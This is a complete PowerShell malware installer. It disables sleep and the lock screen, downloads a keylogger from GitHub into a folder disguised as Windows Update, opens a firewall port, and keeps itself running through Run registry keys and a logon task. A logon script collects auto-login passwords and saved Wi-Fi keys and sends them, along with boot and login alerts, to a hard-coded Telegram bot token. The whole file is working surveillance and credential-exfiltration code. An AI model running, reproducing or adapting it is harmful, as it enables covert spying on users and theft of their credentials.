# Fixed persistent installation - keylogger runs in user session
$TelegramBotToken = "7461592658:AAEJvcK6WH3-VnM2kXXBPtDRf8SoHinR98w"
$TelegramChatId = "1587027869"

# Configure power settings - prevent sleep/logout
Write-Output "Configuring power settings..."

# Set monitor timeout to never (0) when plugged in
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0

# Set sleep timeout to never (0) when plugged in
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0

# Set hibernate to never when plugged in
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0

# Set disk timeout to never
powercfg /change disk-timeout-ac 0
powercfg /change disk-timeout-dc 0

# Disable hybrid sleep
powercfg /setacvalueindex SCHEME_CURRENT SUB_SLEEP HYBRIDSLEEP 0
powercfg /setdcvalueindex SCHEME_CURRENT SUB_SLEEP HYBRIDSLEEP 0

# Configure lid close action to "Do Nothing" when plugged in
powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0
powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 0

# Configure power button to "Do Nothing"
powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 0
powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION 0

# Disable requiring password on wakeup
powercfg /setacvalueindex SCHEME_CURRENT SUB_NONE CONSOLELOCK 0
powercfg /setdcvalueindex SCHEME_CURRENT SUB_NONE CONSOLELOCK 0

# Apply the settings
powercfg /setactive SCHEME_CURRENT

# Disable screen saver and lock screen
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f

# Disable automatic lock screen
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f

# Find/install Python
$py = $null
$pyw = $null
$paths = @("C:\Program Files\Python311","C:\Program Files\Python312","C:\Python311","C:\Python312")
foreach ($p in $paths) {
    if (Test-Path "$p\pythonw.exe") {
        $py = "$p\python.exe"
        $pyw = "$p\pythonw.exe"
        break
    }
}

if (-not $py) {
    $installer = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $installer -UseBasicParsing
    Start-Process $installer -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1","Include_pip=1" -Wait
    Remove-Item $installer
    Start-Sleep 5
    $py = "C:\Program Files\Python311\python.exe"
    $pyw = "C:\Program Files\Python311\pythonw.exe"
}

& $py -m pip install keyboard flask flask-socketio --quiet 2>$null

# Download keylogger to ProgramData (persistent location)
$keyloggerPath = "C:\ProgramData\WindowsUpdate\svcupdate.py"
$keyloggerDir = Split-Path $keyloggerPath
if (-not (Test-Path $keyloggerDir)) {
    New-Item -ItemType Directory -Path $keyloggerDir -Force | Out-Null
}
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Zhuss1/main/main/keylogger-working.py" -OutFile $keyloggerPath -UseBasicParsing

# Add firewall rule
netsh advfirewall firewall add rule name="WindowsUpdate" dir=in action=allow protocol=TCP localport=8081 2>$null | Out-Null

# Create startup script in Registry (runs for ALL users at login)
$startupScript = @"
Start-Process -FilePath '$pyw' -ArgumentList '$keyloggerPath' -WindowStyle Hidden
"@

$startupScriptPath = "C:\ProgramData\WindowsUpdate\startup.ps1"
$startupScript | Out-File -FilePath $startupScriptPath -Encoding UTF8

# Add to RunOnce for current user
$runOncePath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runOncePath -Name "WindowsUpdateService" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $startupScriptPath"

# Also create a scheduled task that runs at ANY user logon
$action = New-ScheduledTaskAction -Execute $pyw -Argument $keyloggerPath
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users"
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)

# Register task to run as the logged-in user (not SYSTEM)
Register-ScheduledTask -TaskName "WindowsUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

# Start it now in current user context
Start-Process $pyw -ArgumentList $keyloggerPath -WindowStyle Hidden

# Send system boot notification to Telegram
$bootMessage = @"
🔔 SYSTEM EVENT

Computer: $env:COMPUTERNAME
User: $env:USERNAME
Event: SYSTEM_BOOT
Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

✅ System BOOTED
Status: Keylogger started
Remote access: Available
"@

try {
    $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
    $body = @{
        chat_id = $TelegramChatId
        text = $bootMessage
    }
    Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing | Out-Null
} catch {}

# Create logon credential capture script
$logonScriptPath = "C:\ProgramData\WindowsUpdate\logondata.ps1"
$logonScript = @"
`$TelegramBotToken = "$TelegramBotToken"
`$TelegramChatId = "$TelegramChatId"

`$credsOutput = @()
`$credsOutput += "=== LOGIN EVENT ==="
`$credsOutput += "Time: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
`$credsOutput += "Computer: `$env:COMPUTERNAME"
`$credsOutput += "User: `$env:USERNAME"
`$credsOutput += ""

`$credsOutput += "=== AUTO-LOGIN CREDENTIALS ==="
try {
    `$winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    `$autoLogin = Get-ItemProperty -Path `$winlogon -ErrorAction SilentlyContinue
    if (`$autoLogin.AutoAdminLogon -eq "1") {
        `$credsOutput += "Username: `$(`$autoLogin.DefaultUsername)"
        `$credsOutput += "Password: `$(`$autoLogin.DefaultPassword)"
    }
} catch {}

`$credsOutput += ""
`$credsOutput += "=== WIFI PASSWORDS ==="
try {
    `$wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { (`$_ -split ":")[-1].Trim() }
    foreach (`$wifiProfile in `$wifiProfiles) {
        `$passInfo = netsh wlan show profile name="`$wifiProfile" key=clear
        `$wifiPassword = (`$passInfo | Select-String "Key Content") -replace ".*: ",""
        if (`$wifiPassword) { `$credsOutput += "`$wifiProfile : `$wifiPassword" }
    }
} catch {}

`$credsFile = "`$env:TEMP\login-`$env:COMPUTERNAME-`$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
`$credsOutput | Out-File -FilePath `$credsFile -Encoding UTF8

# Send immediate text notification
`$loginAlert = @"
🔔 USER LOGIN DETECTED

Computer: `$env:COMPUTERNAME
User: `$env:USERNAME
Time: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

✅ User logged in
Status: Credentials file being sent...
"@

try {
    `$alertUri = "https://api.telegram.org/bot`$TelegramBotToken/sendMessage"
    `$alertBody = @{
        chat_id = `$TelegramChatId
        text = `$loginAlert
    }
    Invoke-RestMethod -Uri `$alertUri -Method Post -Body `$alertBody -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing | Out-Null
} catch {}

Add-Type -AssemblyName System.Net.Http
`$httpClient = New-Object System.Net.Http.HttpClient
`$form = New-Object System.Net.Http.MultipartFormDataContent
`$form.Add((New-Object System.Net.Http.StringContent(`$TelegramChatId)), "chat_id")
`$form.Add((New-Object System.Net.Http.StringContent("Login: `$env:USERNAME @ `$env:COMPUTERNAME")), "caption")
`$fileStream = [System.IO.File]::OpenRead(`$credsFile)
`$fileContent = New-Object System.Net.Http.StreamContent(`$fileStream)
`$form.Add(`$fileContent, "document", [System.IO.Path]::GetFileName(`$credsFile))

try {
    `$response = `$httpClient.PostAsync("https://api.telegram.org/bot`$TelegramBotToken/sendDocument", `$form).Result
} catch {}

if (`$fileStream) { `$fileStream.Dispose() }
if (`$httpClient) { $httpClient.Dispose() }
Remove-Item `$credsFile -Force -ErrorAction SilentlyContinue
"@

$logonScript | Out-File -FilePath $logonScriptPath -Encoding UTF8

# Add logon script to Run key (runs as logged-in user)
Set-ItemProperty -Path $runOncePath -Name "UserDataSync" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $logonScriptPath"

# Run logon script now to send initial credentials
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $logonScriptPath" -WindowStyle Hidden

Write-Output "Installed successfully. Keylogger running at http://localhost:8081"
